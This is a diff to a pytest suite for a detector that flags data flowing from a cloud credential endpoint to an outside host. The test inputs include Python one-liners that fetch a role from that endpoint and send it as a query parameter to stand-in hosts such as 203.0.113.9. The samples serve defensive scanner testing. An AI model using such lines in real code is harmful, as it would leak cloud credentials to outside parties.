@@ -455,14 +455,32 @@ def test_string_decoy_before_the_real_name_still_fails():
     assert _b339(blob).status == FAIL
 
 
-def test_loop_rebinding_the_name_to_literals_is_not_fail():
+def test_loop_rebinding_the_name_is_a_documented_fail():
+    # A loop may run zero times (`for role in []: pass`), so it never clears taint.
     blob = (
         "# file: probe.py\n"
         f'role = requests.get("{_AWS}", timeout=2).text\n'
         'for role in ["admin", "viewer"]:\n'
         '    requests.get("https://example.com/check?r=" + role)\n'
     )
-    assert _b339(blob).status != FAIL
+    assert _b339(blob).status == FAIL
+
+
+@pytest.mark.parametrize(
+    "expr",
+    [
+        '"http://203.0.113.9/?a=" + f"{a}" + role + "z"',
+        '"http://203.0.113.9/?a=" + rb"x" + role + "z"',
+        '"http://203.0.113.9/?a=" + """x""" + role + "z"',
+    ],
+)
+def test_prefixed_or_triple_literal_cannot_hide_the_real_name(expr):
+    blob = (
+        "# file: probe.py\n"
+        f'role = requests.get("{_AWS}", timeout=2).text\n'
+        f"requests.get({expr})\n"
+    )
+    assert _b339(blob).status == FAIL
 
 
 @pytest.mark.parametrize("comment", ["#", "//"])
